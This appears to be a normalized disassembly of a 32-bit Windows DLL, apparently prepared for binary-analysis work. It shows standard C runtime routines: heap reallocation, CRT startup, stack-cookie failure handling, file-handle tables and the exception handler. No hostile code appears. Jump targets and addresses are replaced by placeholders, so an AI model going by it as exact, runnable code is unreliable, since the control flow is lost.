call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_100164b0
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_1000df42
push 0x10
push r--data
call sub_1000ed24
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1000cfb2
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_1000ced5
pop ecx
jmp r-xdata
call sub_1000ed69
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_10010fec
pop ecx
call sub_1000ecdb
push 0x4
call sub_100120e7
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_1001211a
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e086
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_10012618
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_10010fec
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_100128f9
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_1000ecdb
call sub_1000ecdb
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_10010fec
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000ec99
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_1000ecdb
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_1000ecdb
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_100109a0
push ebx
call sub_1001211a
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_1001214a
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1000ec99
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_100109a0
push ebx
push [ ebp - 0x20 ]
call sub_1001214a
add esp 0x14
mov eax esi
sub_1000e173
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
push eax
call sub_10011ec7
pop ecx
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_1001409b
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_10013cf6
push 0x214
push 0x1
call sub_10015ac2
mov esi eax
pop ecx
pop ecx
cmp esi edi
je r-xdata
dec [ rw-data ]
cmp [ rw-data ] edi
jne r-xdata
call sub_10016982
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1001684b
mov [ rw-data ] eax
call sub_1000e9f7
test eax eax
jge r-xdata
call sub_10011ef7
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
xor eax eax
inc eax
push edi
call sub_1001402d
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call sub_10013c5b
pop ecx
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_10012e94
call sub_10016790
test eax eax
jl r-xdata
call sub_10013d47
jmp r-xdata
push esi
call sub_1000ced5
pop ecx
jmp r-xdata
push edi
push esi
call sub_10013d84
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
call sub_1000ec4b
call sub_10013d47
call sub_10011ef7
jmp r-xdata
call sub_1000ec4b
jmp r-xdata
call sub_10016518
test eax eax
jl r-xdata
push 0x0
call sub_10012ccd
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_1000e2a8
push 0xc
push r--data
call sub_1000ed24
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10002e60
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_1000e173
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_1000e173
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10002e60
push edi
push 0x0
push ebx
call sub_1000e173
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_1000ed69
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_1000e2a8
pop ecx
pop ebp
retn 0xc
call sub_100169ce
sub_1000e3c1
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_10015bae
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_10015bae
pop ecx
sub_1000e4c7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecee
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1000e548
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecee
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1000e5ce
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_1000ecee
and [ eax ] 0x0
call sub_1000ecdb
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_1000ecee
mov [ eax ] esi
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_1000d8e6
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_1000e645
push 0xc
push r--data
call sub_1000ed24
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_100120e7
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_1000ed69
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e6dc
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10016a73
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_1000e6e5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1000e70c
push 0x18
push r--data
call sub_1000ed24
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_10012024
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_100120e7
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e89d
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_1000ed69
retn
push 0x40
push 0x20
call sub_10015ac2
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_1000e645
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_100120e7
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1000e7df
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10016a73
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_1000e8a6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_1000e5ce
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_1000ed01
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_1000e91b
push 0x10
push r--data
call sub_1000ed24
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1000ecee
and [ eax ] 0x0
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecee
mov [ eax ] edi
call sub_1000ecdb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000d8e6
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1000ed69
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1000e645
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000ecdb
mov [ eax ] 0x9
call sub_1000ecee
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000e8a6
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e9ed
mov eax [ ebp - 0x1c ]
sub_1000e9f7
push 0x54
push r--data
call sub_1000ed24
xor edi edi
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x64 ]
push eax
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
push 0x40
push 0x20
pop esi
push esi
call sub_10015ac2
pop ecx
pop ecx
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] esi
lea ecx [ eax + 0x800 ]
jmp r-xdata
cmp eax ecx
jb r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov [ eax + 0x8 ] edi
mov [ eax + 0x24 ] 0x0
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
mov [ eax + 0x38 ] edi
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov ecx [ rw-data ]
add ecx 0x800
cmp [ ebp - 0x32 ] di
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x30 ]
cmp eax edi
je r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov edi [ eax ]
lea ebx [ eax + 0x4 ]
lea eax [ ebx + edi ]
mov [ ebp - 0x1c ] eax
mov esi 0x800
cmp edi esi
jl r-xdata
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
mov edi esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
cmp [ rw-data ] edi
jl r-xdata
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push 0x40
push 0x20
call sub_10015ac2
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
call sub_1000ed69
retn
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
mov edi [ rw-data ]
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
lea edx [ eax + 0x800 ]
jmp r-xdata
and [ ebp - 0x20 ] 0x0
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
cmp ecx 0xffffffff
je r-xdata
cmp eax edx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10016a73
pop ecx
pop ecx
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
inc [ ebp - 0x20 ]
inc ebx
add [ ebp - 0x1c ] 0x4
cmp [ ebp - 0x20 ] edi
jl r-xdata
cmp ecx 0xfffffffe
je r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
and [ eax + 0x24 ] 0x80
mov [ eax + 0x25 ] 0xa
mov [ eax + 0x26 ] 0xa
and [ eax + 0x38 ] 0x0
mov [ eax + 0x34 ] 0x0
add eax 0x40
mov edx [ ecx ]
add edx esi
inc [ ebp - 0x20 ]
inc [ esi + 0x8 ]
jmp r-xdata
mov al [ ebx ]
test al 0x1
je r-xdata
test al 0x8
jne r-xdata
mov esi [ ebp - 0x20 ]
mov eax esi
sar eax 0x5
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ esi ] eax
mov al [ ebx ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10016a73
pop ecx
pop ecx
test eax eax
je r-xdata
push ecx
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ esi + 0x8 ]
sub_1000ec4b
mov edi edi
push esi
push edi
mov esi rw-data
add esi 0x4
cmp esi rw-data
jl r-xdata
lea eax [ edi + 0x800 ]
jmp r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
pop esi
retn
cmp edi eax
jb r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push [ esi ]
call sub_1000ced5
and [ esi ] 0x0
pop ecx
mov eax [ esi ]
add edi 0x40
add eax 0x800
lea eax [ edi + 0xc ]
push eax
call [ DeleteCriticalSection@IAT ]
sub_1000ec99
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_1000ed01
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1000ecee
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_1000ec99
pop ecx
mov esi eax
call sub_1000ecdb
mov [ eax ] esi
pop esi
pop ebp
retn
sub_1000ed24
push sub_1000ed80
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_1000ed80
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000c0a5
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000c0a5
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_1000f600
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_1000f5b6
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1000c0a5
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000c0a5
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_1000f5e6
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_1000f600
mov eax [ ebp + 0xc ]
push r--data
call sub_10015840
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1000c0a5
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_1000f5cd
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000c0a5
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_1000ef12
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_10015ac2
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_10015ac2
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_1000efe3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_100120e7
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_1000f024
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_100120e7
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_1000f056
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_1001200d
pop ecx
pop ebp
retn
sub_1000f092
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_1001200d
pop ecx
pop ebp
retn
sub_1000f0c1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
